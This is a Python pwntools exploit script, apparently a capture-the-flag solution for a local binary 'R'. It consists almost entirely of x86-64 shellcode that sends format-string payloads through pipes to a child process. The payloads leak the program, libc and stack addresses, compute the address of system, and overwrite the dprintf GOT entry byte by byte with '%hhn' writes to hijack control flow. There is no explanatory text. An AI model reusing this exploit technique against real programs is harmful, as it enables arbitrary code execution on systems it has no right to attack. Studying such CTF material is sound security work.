from pwn import *
context.arch = 'amd64'

# p = process('./R', env={'LD_PRELOAD': './libc-2.29.so'})
context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./R', env={'LD_PRELOAD': './libc-2.29.so'}, gdbscript='aslr off\nset follow-fork-mode parent\nbreakrva 0x18F2\n')

p = gdb.debug('./R', env={'LD_PRELOAD': './libc-2.29.so'}, gdbscript='aslr off\nset follow-fork-mode child\nbreakrva 0x1A2E\n')

shellcode = asm(
    '''
    /* set stack */
    mov rsp, rdx
    add rsp, 0x900

    /* leak pie base */
    mov rax, 0x7024333325   /* %33$p */
    push rax
    mov rax, 0x4d4d4d4d4d4d4d4d
    push rax
    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 0
    syscall     /* read from pipe */
    pop r15
    add rsp, 2
    pop rax
    mov dl, 8
    call str2hex
    mov r15, rbx
    shl r15, 16
    pop rax
    mov dl, 4
    call str2hex
    add r15, rbx
    sub r15, 0x1a40     # r15 pie base
    mov r14, r15
    add r14, 0x4038     # dprintf GOT
    
    /* leak libc base */
    mov rax, 0x7024343325   /* %34$p */
    push rax
    mov rax, 0x4d4d4d4d4d4d4d4d
    push rax
    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 0
    syscall     /* read from pipe */
    pop r15
    add rsp, 2
    pop rax
    mov dl, 8
    call str2hex
    mov r15, rbx
    shl r15, 16
    pop rax
    mov dl, 4
    call str2hex
    add r15, rbx    /* __libc_start_main */
    sub r15, 0x26b6b
    add r15, 0x52fd0    
    mov r13, r15    /* system */
    
    /* leak rbp */
    mov rax, 0x7024363325   /* %36$p */
    push rax
    mov rax, 0x4d4d4d4d4d4d4d4d
    push rax
    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 0
    syscall     /* read from pipe */
    pop r15
    add rsp, 2
    pop rax
    mov dl, 8
    call str2hex
    mov r15, rbx
    shl r15, 16
    pop rax
    mov dl, 4
    call str2hex
    add r15, rbx
    sub r15, 0xe8   /* rbp */
    sub rsp, 6
    
    /* use fmt to write dprintf got on stack */
    mov rax, 0x94    /* fake got */
    mov r11, 0x306
    call push_str

    mov rax, r14    /* dprintf got */
    mov r11, 0x602
    call push_str

    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */

    mov rax, 0x95    /* fake got */
    mov r11, 0x306
    call push_str

    mov rax, r14    /* dprintf got+1 */
    shr rax, 8
    mov r11, 0x602
    call push_str

    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */

    mov rax, 0x96    /* fake got */
    mov r11, 0x306
    call push_str

    mov rax, r14    /* dprintf got+1 */
    shr rax, 16
    mov r11, 0x602
    call push_str

    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */

    mov rax, 0x97    /* fake got */
    mov r11, 0x306
    call push_str

    mov rax, r14    /* dprintf got+1 */
    shr rax, 24
    mov r11, 0x602
    call push_str

    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */

    mov rax, 0x98    /* fake got */
    mov r11, 0x306
    call push_str

    mov rax, r14    /* dprintf got+1 */
    shr rax, 32
    mov r11, 0x602
    call push_str

    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */
    
    mov rax, 0x99    /* fake got */
    mov r11, 0x306
    call push_str

    mov rax, r14    /* dprintf got+1 */
    shr rax, 40
    mov r11, 0x602
    call push_str

    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */

    mov rax, 0x9a    /* fake got */
    mov r11, 0x306
    call push_str

    mov rax, r14    /* dprintf got+1 */
    shr rax, 48
    mov r11, 0x602
    call push_str

    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */

    mov rax, 0x9b    /* fake got */
    mov r11, 0x306
    call push_str

    mov rax, r14    /* dprintf got+1 */
    shr rax, 56
    mov r11, 0x602
    call push_str

    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */

    mov rax, 0x93    /* fake got */
    mov r11, 0x306
    call push_str

    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */
    /**************************************************************************/
    
    
    jmp r9

pipe:

push_str:
    pop rbp
    sub rax, 8
    and rax, 0xff
    call hex2str

    /* padding */
    mov rax, 0xff
    mov r8, rbx
    mov rcx, 0
d:
    sub al, bl
    inc rcx
    cmp rcx, 100
    jne d
    xor rcx, rcx
dd:
    sub al, bh
    inc rcx
    cmp rcx, 9
    jne dd
    sub al, bh
    shr rbx, 16
    sub al, bl
    sub al, 15
    and rax, 0xff
    add al, 1
    call hex2str
    push rax
    mov byte ptr [rsp], 0x25    /* % */
    mov byte ptr [rsp+1], bl
    add byte ptr [rsp+1], 0x30
    mov byte ptr [rsp+2], bh
    add byte ptr [rsp+2], 0x30
    shr rbx, 16
    mov byte ptr [rsp+3], bl
    add byte ptr [rsp+3], 0x30
    mov byte ptr [rsp+4], 0x63  /* c */
    mov byte ptr [rsp+5], 0x4d
    mov byte ptr [rsp+6], 0x4d
    mov byte ptr [rsp+7], 0x4d
    
    mov rax, 0x4d4d4d4d6e686824 /* $hhnMMMM */
    push rax
    push rax
    mov rbx, r8
    mov byte ptr [rsp], 0x25    /* % */
    mov byte ptr [rsp+1], bl
    add byte ptr [rsp+1], 0x30
    mov byte ptr [rsp+2], bh
    add byte ptr [rsp+2], 0x30
    shr rbx, 16
    mov byte ptr [rsp+3], bl
    add byte ptr [rsp+3], 0x30
    mov byte ptr [rsp+4], 0x63  /* c */
    mov byte ptr [rsp+5], 0x25  /* % */
    mov rax, r11
    mov byte ptr [rsp+6], ah
    add byte ptr [rsp+6], 0x30
    mov byte ptr [rsp+7], al
    add byte ptr [rsp+7], 0x30
    mov rax, 0x4d4d4d4d4d4d4d4d
    push rax
    jmp rbp

str2hex:
    xor rbx, rbx
    xor rcx, rcx
loop:
    cmp al, 0x00
    je check
    nop
    cmp al, 0x61
    jb num
    sub al, 0x57
    jmp check
num:
    sub al, 0x30
check:
    add bl, al
    shl rbx, 4
    shr rax, 8
    add cl, 1
    cmp cl, dl
    jne loop
    shr rbx, 4
    ret

hex2str:    /* input = rax, output = rbx */
    xor rbx, rbx
    xor rdi, rdi
again:
    xor rdx, rdx
    mov ecx, 11
    sub ecx, 1
    div ecx
    mov bl, dl
    shl rbx, 8
    inc rdi
    cmp rdi, 3
    jne again
    shr rbx, 8
    ret
    '''
)
p.sendline(shellcode)
print(len(shellcode))
p.interactive()
